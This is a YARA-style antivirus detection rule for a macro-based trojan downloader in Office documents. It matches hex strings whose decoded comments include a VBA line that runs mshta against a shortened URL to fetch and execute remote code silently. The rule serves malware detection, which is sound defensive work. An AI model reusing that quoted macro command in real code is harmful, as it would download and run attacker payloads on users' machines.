
rule TrojanDownloader_O97M_Powdow_UNBT_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.UNBT!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 01 00 "
		
	strings :
		$a_01_0 = {53 75 62 20 64 61 73 64 61 77 28 29 } //01 00  Sub dasdaw()
		$a_01_1 = {6d 79 76 61 6c 75 65 2e 52 75 6e 20 22 6d 73 68 74 61 20 68 74 74 70 73 3a 2f 2f 62 69 74 6c 79 2e 63 6f 6d 2f 61 73 64 71 77 64 65 72 72 74 67 72 66 73 64 61 66 73 66 73 64 66 22 2c 20 30 } //00 00  myvalue.Run "mshta https://bitly.com/asdqwderrtgrfsdafsfsdf", 0
	condition:
		any of ($a_*)
 
}